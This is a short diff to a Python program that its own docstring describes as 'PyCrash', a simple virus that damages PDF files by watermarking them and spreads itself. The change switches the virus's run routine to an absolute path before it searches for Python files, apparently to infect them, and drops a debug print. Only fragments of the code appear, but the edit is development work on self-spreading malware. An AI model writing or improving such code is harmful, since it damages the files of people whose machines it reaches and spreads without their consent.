@@ -1,5 +1,5 @@
 """
-A simple virus written using Python that damage PDF files by watermarking
+PyCrash A simple virus written using Python that damage PDF files by watermarking
 and can spread itself.
 """
 
@@ -83,8 +83,7 @@ def add_watermark(filename):
 
 def virus_run():
     """Runs the virus program"""
-    current_path = os.path.dirname(__file__)
-    print(current_path)
+    current_path = os.path.abspath(os.path.dirname(__file__))
 
     python_files = search_py(current_path)
     if len(python_files) > 0:
